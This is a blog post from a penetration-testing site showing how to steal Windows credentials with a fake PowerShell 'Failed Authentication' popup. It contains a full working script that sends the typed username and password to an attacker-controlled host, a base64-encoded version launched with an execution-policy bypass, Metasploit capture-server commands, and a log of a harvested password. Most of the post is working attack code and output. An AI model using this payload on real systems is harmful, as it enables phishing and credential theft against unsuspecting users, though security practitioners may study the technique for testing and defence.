<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Powershell Popups + Capture</title>
    <meta name="description" content="" />
    <link href="//fonts.googleapis.com/css?family=Noto+Sans:300,400,700" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic" rel="stylesheet" type="text/css">
    <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
    <link href="//blog.room362.com/themes/Saga/assets/css/style.css?v=1.0.0" rel="stylesheet" type="text/css">
    <link href="//blog.room362.com/themes/Saga/assets/css/animate.min.css?v=1.0.0" rel="stylesheet" type="text/css">
    <link href="//blog.room362.com/themes/Saga/favicon.ico" rel="shortcut icon">
    <link rel="canonical" href="http://blog.room362.com/2015/01/12/Powershell-Popups-Capture.html" />
    
    <meta property="og:site_name" content="Room362.com" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="Powershell Popups + Capture" />
    <meta property="og:description" content="Metasploit Minute has entered into it&amp;#8217;s 3rd &quot;season&quot;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute..." />
    <meta property="og:url" content="http://blog.room362.com/2015/01/12/Powershell-Popups-Capture.html" />
    <meta property="article:published_time" content="2015-01-12T05:00:00.000Z" />
    <meta property="article:modified_time" content="2015-05-13T04:02:24.450Z" />
    <meta property="article:tag" content="powershell" />
    <meta property="article:tag" content="metasploit" />
    <meta property="article:tag" content="creds" />
    <meta property="article:tag" content="howto" />
    
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="Powershell Popups + Capture" />
    <meta name="twitter:description" content="Metasploit Minute has entered into it&amp;#8217;s 3rd &quot;season&quot;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute..." />
    <meta name="twitter:url" content="http://blog.room362.com/2015/01/12/Powershell-Popups-Capture.html" />
    
    <script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "Article",
    "publisher": "Room362.com",
    "author": {
        "@type": "Person",
        "name": "Rob Fuller",
        "image": "https://avatars.githubusercontent.com/u/679319?v=3",
        "url": "undefined/author/undefined",
        "sameAs": "http://www.room362.com/"
    },
    "headline": "Powershell Popups + Capture",
    "url": "http://blog.room362.com/2015/01/12/Powershell-Popups-Capture.html",
    "datePublished": "2015-01-12T05:00:00.000Z",
    "dateModified": "2015-05-13T04:02:24.450Z",
    "keywords": "powershell,  metasploit,  creds,  howto",
    "description": "Metasploit Minute has entered into it&amp;#8217;s 3rd &quot;season&quot;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute..."
}
    </script>

    <meta name="generator" content="Ghost ?" />
    <link rel="alternate" type="application/rss+xml" title="Room362.com" href="http://blog.room362.com/rss" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
</head>
<body class="post-template tag-powershell tag-metasploit tag-creds tag-howto">
    <header id="header" class="animated fadeIn">
    <div class="header-background">
    <section class="blog-content">
        <a id="site-url" class="blog-title" href="http://blog.room362.com">Room362.com</a>
        <span class="blog-description"></span>
        <nav class="links fadeIn animated">
            <ul>
                <!-- <li class="rss"><a title="RSS Feed" href="/rss/"><i class="fa fa-fw fa-rss-square"></i></a></li> -->
        
            </ul>
        </nav>
    </section>
    <section class="header-content">
        <h1 class="post-title animated fadeInUp">Powershell Popups + Capture</h1>
        <span class="post-data"><span class="date animated fadeInUp"><i class="fa fa-clock-o"></i> <time class="timesince date" data-timesince="1421038800" datetime="2015-01-12T00:00" title="12 January 2015">2015-01-12 00:00:00<ago class="ago"></time></span>
            <span class="tags animated fadeInUp"><i class="fa fa-tags"></i> <a href="http://blog.room362.com/tag/powershell">powershell</a>, <a href="http://blog.room362.com/tag/metasploit"> metasploit</a>, <a href="http://blog.room362.com/tag/creds"> creds</a>, <a href="http://blog.room362.com/tag/howto"> howto</a></span>
            <span class="author animated fadeInUp"><i class="fa fa-user"></i> <a href="">Rob Fuller</a></span></span>
    </section>
    </div>
</header>
<main id="main" class="content">
    <article itemtype="http://schema.org/BlogPosting" class="animated fadeIn content post post tag-powershell tag-metasploit tag-creds tag-howto">
        <section class="post-content">
            <div class="paragraph">
<p>Metasploit Minute has entered into it&#8217;s 3rd "season". And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-)</p>
</div>
<div class="paragraph">
<p>Here is the video:</p>
</div>
<iframe width="560" height="315" src="//www.youtube.com/embed/H_E3FNF8rBw" frameborder="0" allowfullscreen></iframe>
<div class="paragraph">
<p>Here is the code:</p>
</div>
<div class="listingblock">
<div class="title">passcreds.ps1</div>
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$wc = new-object net.webclient;
$wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
$result = $wc.downloadstring('https://172.16.102.163');</code></pre>
</div>
</div>
<div class="paragraph">
<p>Lets break down the code line by line:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserName,[Environment]::UserDomainName);</code></pre>
</div>
</div>
<div class="paragraph">
<p>This tells windows to prompt for credentials, with the title of "Failed Authentication", no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};</code></pre>
</div>
</div>
<div class="paragraph">
<p>Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$wc = new-object net.webclient;
$wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");</code></pre>
</div>
</div>
<div class="paragraph">
<p>Creates a new webclient object and sets its user agent to 'wget'</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;</code></pre>
</div>
</div>
<div class="paragraph">
<p>Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');</code></pre>
</div>
</div>
<div class="paragraph">
<p>Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$result = $wc.downloadstring('https://172.16.102.163');</code></pre>
</div>
</div>
<div class="paragraph">
<p>And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">cat power.txt | iconv --to-code UTF-16LE | base64

JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=</code></pre>
</div>
</div>
<div class="paragraph">
<p>Then execute <code>powershell -ep bypass -enc &lt;the encoded text from above&gt;</code> and you get this:</p>
</div>
<div class="paragraph">
<p>Image should be here:</p>
</div>
<div class="imageblock">
<div class="content">
<img src="/images/2014-09-03-powershellpopup.png" alt="2014 09 03 powershellpopup.png">
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>root@wpad:~/metasploit-framework# ./msfconsole -Lq
msf &gt; use auxiliary/server/capture/http_basic
msf auxiliary(http_basic) &gt; show options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   SSLVersion   SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
   URIPATH                       no        The URI to use for this exploit (default is random)

msf auxiliary(http_basic) &gt; set SSL true
SSL =&gt; true
msf auxiliary(http_basic) &gt; set SRVPORT 443
SRVPORT =&gt; 443
msf auxiliary(http_basic) &gt; set URIPATH /
URIPATH =&gt; /
msf auxiliary(http_basic) &gt; run
[*] Auxiliary module execution completed
msf auxiliary(http_basic) &gt;
[*] Listening on 0.0.0.0:443...
[*] Using URL: https://0.0.0.0:443/
[*]  Local IP: https://172.16.102.163:443/
[*] Server started.
[*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
[+] 172.16.102.140 - Credential collected: "SITTINGDUCK\user:ASDqwe123" =&gt; /</pre>
</div>
</div>
<div class="paragraph">
<p>Game over!</p>
</div>
        </section>

    </article>

</main>
    <footer class="animated fadeIn" id="footer">
        <section class="colophon">
          <section class="copyright">Copyright &copy; <span itemprop="copyrightHolder">Room362.com</span>. <span rel="license">All Rights Reserved</span>.</section>
          <section class="poweredby">Published with <a class="icon-ghost" href="http://hubpress.io">HubPress</a></section>
        </section>
        <section class="bottom">
          <section class="attribution">
            <a href="http://github.com/Reedyn/Saga">Built with <i class="fa fa-heart"></i> and Free and Open-Source Software</a>.
          </section>
        </section>
    </footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment-with-locales.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js?v="></script> 
      <script type="text/javascript">
        jQuery( document ).ready(function() {
          // change date with ago
          jQuery('ago.ago').each(function(){
            var element = jQuery(this).parent();
            element.html( moment(element.text()).fromNow());
          });
        });

        hljs.initHighlightingOnLoad();      
      </script>
    <script src="//blog.room362.com/themes/Saga/assets/js/scripts.js?v=1.0.0"></script>
    
</body>
</html>
